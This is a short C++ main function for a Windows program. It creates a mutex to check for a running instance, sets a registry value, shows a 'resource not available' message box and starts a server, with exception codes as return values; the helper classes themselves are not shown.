#include <iostream>
#include "DisplayBox.h"
#include "RegVal.h"
#include "Mutex.h"
#include "Server.h"
#include "Exception.h"


/**
* @brief main function that runs all the logic
* @return success, creatingMutexException, mutexTakenException, creatingKeyException, openingKeyException - 0, 1, 2, 3, 4
*/
int main(void)
{
    // Create a mutex with no initial owner
    try
    {
        Mutex mutex = Mutex();
        mutex.isMutexTaken();

        RegVal();

        DisplayResourceNAMessageBoxW();

        std::cout << "About to initialize the server";
        Server server = Server();
    }
    catch (ExceptionClass e)
    {
        return e.handleException();
    }    

    return success;
}